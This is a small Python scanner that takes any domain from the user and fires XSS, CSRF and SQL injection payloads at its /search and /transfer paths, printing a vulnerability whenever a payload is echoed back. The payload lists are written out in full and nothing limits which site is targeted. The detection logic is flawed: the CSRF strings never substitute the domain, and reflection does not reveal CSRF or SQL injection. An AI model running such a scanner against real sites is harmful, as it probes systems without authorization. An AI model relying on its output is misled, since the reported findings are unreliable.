import requests
from bs4 import BeautifulSoup

def test_vulnerabilities(domain):
    # Test XSS vulnerability
    xss_payloads = [
        '"><script>alert("XSS")</script>',
        "'><script>alert('XSS')</script>",
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<svg/onload=alert("XSS")>'
    ]
    for payload in xss_payloads:
        test_url = f"https://{domain}/search?query={payload}"
        response = requests.get(test_url)
        if payload in response.text:
            print(f"XSS vulnerability found with payload: {payload}")
        else:
            print(f"No XSS vulnerability found with payload: {payload}")

    # Test CSRF vulnerability
    csrf_payloads = [
        '<form action="https://{domain}/transfer" method="POST"><input type="hidden" name="amount" value="100"></form>',
        '<img src="https://{domain}/transfer?amount=100">',
        '<iframe src="https://{domain}/transfer?amount=100"></iframe>'
    ]
    for payload in csrf_payloads:
        test_url = f"https://{domain}/{payload}"
        response = requests.get(test_url)
        if payload in response.text:
            print(f"CSRF vulnerability found with payload: {payload}")
        else:
            print(f"No CSRF vulnerability found with payload: {payload}")

    # Test SQL injection vulnerability
    sql_payloads = [
        "' OR 1=1--",
        "' OR '1'='1",
        "' OR ''='"
    ]
    for payload in sql_payloads:
        test_url = f"https://{domain}/search?query={payload}"
        response = requests.get(test_url)
        if payload in response.text:
            print(f"SQL injection vulnerability found with payload: {payload}")
        else:
            print(f"No SQL injection vulnerability found with payload: {payload}")

# Prompt the user for a domain name
domain = input("Enter the domain name (e.g., loki.com): ")
test_vulnerabilities(domain)